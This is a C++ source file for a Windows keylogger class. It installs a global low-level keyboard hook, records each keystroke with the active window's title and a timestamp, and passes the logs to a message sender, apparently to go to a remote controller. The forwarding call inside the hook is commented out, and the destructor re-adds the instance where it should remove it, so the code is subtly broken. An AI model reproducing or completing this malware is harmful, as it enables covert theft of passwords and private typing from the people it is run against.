#include "KeyLogger.h"

#include "Format.h"
#include "PressedKey.h"
#include "Trace.h"

std::mutex KeyLogger::_mutex;
std::vector<KeyLogger*> KeyLogger::_instances;
wil::unique_hhook KeyLogger::_hook;
std::string KeyLogger::_lastWindowTitle;

KeyLogger::KeyLogger(
	IMessageSender* sender
) :
	_sender(sender)
{
	std::lock_guard guard(_mutex);

	if (_instances.empty())
	{
		const auto windowsHook = SetWindowsHookEx(
			WH_KEYBOARD_LL,
			&KeyLogger::HookCallback,
			nullptr,
			0);

		_hook.reset(windowsHook);
	}

	_instances.push_back(this);
}

KeyLogger::~KeyLogger()
{
	_instances.emplace_back(this);

	if (_instances.empty())
	{
		_hook.reset();
	}
}

LRESULT KeyLogger::HookCallback(const int nCode, const WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN)
	{
		const auto keyboardEvent = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		const std::string log = GetLog(keyboardEvent.vkCode);

		for (const auto& instance : _instances)
		{
			//instance->LogKeyboardEvent(log);
		}
	}


	return CallNextHookEx(_hook.get(), nCode, wParam, lParam);
}

std::string KeyLogger::GetLog(const int keyStroke)
{
	std::stringstream output;

	const auto foregroundWindow = wil::unique_hwnd(GetForegroundWindow());
	const auto layout = GetKeyboardLayout(foregroundWindow.get());
	const auto prefix = GetWindowPrefix(foregroundWindow.get());

	output << prefix;

	const auto pressedKey = PressedKey(keyStroke, layout);
	output << pressedKey.ToString();

	return output.str();
}

std::string KeyLogger::GetWindowTitle(const HWND windowHandle)
{
	auto windowTitle = std::string(GetWindowTextLength(windowHandle) + 1, L'\0');

	GetWindowTextA(windowHandle, &windowTitle[0], windowTitle.size());

	return windowTitle;
}

HKL KeyLogger::GetKeyboardLayout(const HWND windowHandle)
{
	const DWORD threadId = GetWindowThreadProcessId(windowHandle, nullptr);

	return ::GetKeyboardLayout(threadId);
}

std::string KeyLogger::GetWindowPrefix(const HWND windowHandle)
{
	const std::string windowTitle = GetWindowTitle(windowHandle);

	if (_lastWindowTitle != windowTitle)
	{
		_lastWindowTitle = windowTitle;

		// get time
		time_t t = time(nullptr);
		struct tm tm;
		localtime_s(&tm, &t);
		char s[64];
		strftime(s, sizeof s, "%c", &tm);

		return Format("[Window: %s - at %s]\n", windowTitle.c_str(), s);
	}

	return "";
}

void KeyLogger::LogKeyboardEvent(const std::string& log) const
{
	Trace(log.c_str());

	const auto content = SharedSpan(log);

	_sender->Send(MessageType::KeyLog, content);
}
